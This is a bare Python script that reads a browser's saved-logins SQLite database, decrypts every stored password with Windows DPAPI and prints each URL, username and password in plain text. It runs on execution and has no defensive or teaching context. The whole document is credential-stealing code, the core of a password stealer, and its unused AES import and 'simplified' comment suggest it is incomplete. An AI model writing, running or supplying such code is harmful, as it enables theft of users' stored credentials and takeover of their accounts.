import sqlite3
import base64
from Crypto.Cipher import AES
import win32crypt  # Requires pywin32

def get_passwords():
    conn = sqlite3.connect('Login Data.db')
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        user = row[1]
        pwd = row[2]
        # Decrypt using DPAPI (simplified)
        decrypted_pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1]
        print(f"URL: {url}, User: {user}, Password: {decrypted_pwd.decode('utf-8')}")
    conn.close()

get_passwords()